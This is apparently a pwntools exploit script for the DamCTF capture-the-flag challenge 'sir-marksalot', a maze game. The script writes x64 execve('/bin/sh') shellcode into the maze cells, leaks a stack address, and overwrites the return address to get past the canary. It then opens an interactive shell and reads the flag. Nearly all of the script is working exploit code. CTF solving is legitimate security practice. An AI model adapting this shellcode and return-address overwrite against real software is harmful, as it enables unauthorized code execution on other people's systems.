from pwn import *

context.arch = 'amd64'
# context.log_level = 'debug'

# maze game

if args.LOCAL:
    # context.terminal = ['tmux', 'splitw', '-h']
    p = process('./sir-marksalot')
    # gdb.attach(p)
else:
    p = remote('chals.damctf.xyz', 31314)

p.sendlineafter(b'What would you like to do?\n', b'jump up and down')

x64_shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

# leak stack address & ret2shellcode. But, how?

payload_all_ways = x64_shellcode.ljust(28, b'\x00') + b'\x0f'

nowi, nowj = 0, 0

def getPosition():
    p.sendlineafter(b'm - show map): ', b'm')
    global nowi, nowj
    p.recvline()
    tmp = p.recv(4)
    while b'*' not in tmp:
        if nowj < 39:
            nowj += 1
        else:
            p.recvline()
            p.recvline()
            nowi += 1
            nowj = 0
        tmp = p.recv(4)
    print("now : ({}, {})".format(nowi, nowj))

def write(payload: bytes):
    print("write . ", "now : ({}, {})".format(nowi, nowj), payload)
    p.sendlineafter(b'm - show map): ', b'x')
    p.sendlineafter(b'What would you like to write?\n', payload)

def move(command: str):
    global nowi, nowj
    if command == 'w':
        p.sendlineafter(b'm - show map): ', b'w')
        nowi -= 1
    elif command == 'a':
        nowj -= 1
        p.sendlineafter(b'm - show map): ', b'a')
    elif command == 's':
        nowi += 1
        p.sendlineafter(b'm - show map): ', b's')
    else:
        nowj += 1
        p.sendlineafter(b'm - show map): ', b'd')
    print("move {}. ".format(command), "now : ({}, {})".format(nowi, nowj))

getPosition()

originI, originJ = nowi, nowj
# move up to get the grue address
for _ in range(nowi):
    write(payload_all_ways)
    move('w')

for _ in range(nowj+1):
    write(payload_all_ways)
    move('a')
# p.sendlineafter(b'm - show map): ', b'm')
# p.recvuntil(b'On the wall is written: ')
grue_address = u64(p.recvuntil(b'\x7f')[-6:]+b'\x00'*2)
print("==================================================")
p.success("grue_addr = " + hex(grue_address))
print("==================================================")

write(p64(grue_address) + b'a'*4 + p32(0xffffffff) + b'a'*12 + b'\x0f')
move('d')

# move down and right to overwrite return address
for _ in range(originJ):
    move('d')
for _ in range(originI):
    move('s')
for _ in range(39-originI):
    write(payload_all_ways)
    move('s')
for _ in range(40-originJ):
    write(payload_all_ways)
    move('d')

# hope we could go through the canary
move('d')

# move d forward
write(payload_all_ways)
move('d')

# write and move back
write(b'\x00'*8 + p64(grue_address+32) + b'a'*12 + b'\x0f')
move('a')
move('a')
move('a')

assert all([nowi == 39, nowj==39])


# find grue and execute shellcode
p.success("begin to find grue...")
flag = True
for i in range(39):
    for j in range(39):
        command = 'a'
        if not flag:
            command = 'd'
        try:
            write(payload_all_ways)
            move(command)# move left or right
            # print(command.decode(), end=' ')
        except:
            p.sendline(b'cat flag')
            p.interactive()
    try:
        write(payload_all_ways)
        move('w')
        # print('w')
    except:
        p.interactive()
    flag = not flag


p.interactive()
